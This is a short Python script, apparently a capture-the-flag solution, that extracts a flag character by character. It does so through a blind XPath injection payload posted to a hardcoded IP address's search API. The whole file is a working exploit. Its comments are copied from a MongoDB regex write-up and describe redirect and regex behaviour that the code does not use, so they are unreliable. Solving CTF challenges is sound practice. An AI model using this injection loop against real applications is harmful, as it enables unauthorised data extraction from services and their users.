import requests
import string

# From https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/

# We are sure that password is the flag which starts with "TWCTF{"
# and ends with "}"

flag = ""
url = "http://165.227.236.40:30406/api/search"

# Each time a 302 redirect is seen, we should restart the loop

restart = True

while restart:
    restart = False

    # Characters like *, ., &, and + has to be avoided because we use regex

    for i in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        payload = flag + i
        term = "blah' or 1=1][3]/selfDestructCode[starts-with(., '{}')]['a'='a".format(payload)
        post_data = {'search': term}
        r = requests.post(url, json=post_data, allow_redirects=False)

        # A correct password means we get a 302 redirect

        if "doesn't" not in r.text:
            print(payload)
            restart = True
            flag = payload

            # Exit if "}" gives a valid redirect

            if i == "}":
                print("\nFlag: " + flag)

                exit(0)
            break